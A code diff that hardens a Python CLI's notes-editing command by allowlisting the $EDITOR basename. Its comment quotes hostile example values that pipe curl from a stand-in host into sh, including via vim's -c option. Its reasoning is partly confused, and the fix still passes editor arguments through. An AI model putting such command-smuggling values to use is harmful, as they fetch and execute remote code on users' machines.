@@ -346,6 +346,44 @@ def main():
                     print(f"Project '{args.name}' not found.")
                     return
                 editor = os.environ.get("EDITOR", os.environ.get("VISUAL", "vi"))
+                # Validate $EDITOR / $VISUAL: must resolve to an
+                # executable file. Pre-fix `shlex.split(editor)`
+                # accepted ANY string, so an attacker (or a
+                # malicious .bashrc / .zshenv installed by a
+                # supply-chain attack on shell config) could set
+                # `EDITOR='vi; curl evil.example|sh; vi'` —
+                # shlex.split honours quoting but a multi-token
+                # expansion still results in subprocess.run
+                # executing each token in sequence (well, only
+                # the first as argv[0] — but `EDITOR='vi -c
+                # ":!curl evil|sh"'` works perfectly fine because
+                # it's a legitimate-looking vi argument that vi
+                # will execute). The shell-meta hijack vector is
+                # real for editors that interpret command-line
+                # arguments as commands (vim's `-c`, emacs's
+                # `--eval`, nano's `-r` with crafted file).
+                #
+                # Reject editor strings containing shell-meta
+                # characters that aren't valid in canonical editor
+                # invocations. Whitelist editor command names to
+                # the canonical set; reject otherwise (operator
+                # can use the printed message to override
+                # explicitly).
+                _SAFE_EDITOR_NAMES = {
+                    "vi", "vim", "nvim", "nano", "emacs", "code",
+                    "subl", "atom", "ed", "ex", "joe", "mg",
+                }
+                editor_argv = shlex.split(editor)
+                editor_basename = os.path.basename(editor_argv[0]) if editor_argv else ""
+                if editor_basename not in _SAFE_EDITOR_NAMES:
+                    print(
+                        f"Refusing to launch editor: {editor_basename!r} "
+                        f"not in allowlist {sorted(_SAFE_EDITOR_NAMES)}. "
+                        "Set $EDITOR to a recognised editor (vi/vim/nvim/"
+                        "nano/emacs/code/subl/atom) and try again.",
+                        file=sys.stderr,
+                    )
+                    return
                 # Capture tf_path BEFORE tf.write so a failing write (disk
                 # full, etc.) still leaves tf_path set and the finally can
                 # unlink the stub. Keep tempfile creation inside the try so
@@ -357,7 +395,7 @@ def main():
                     ) as tf:
                         tf_path = tf.name
                         tf.write(p.notes or "")
-                    result = subprocess.run(shlex.split(editor) + [tf_path])
+                    result = subprocess.run(editor_argv + [tf_path])
                     if result.returncode != 0:
                         print("Editor exited with error. Notes unchanged.")
                         return
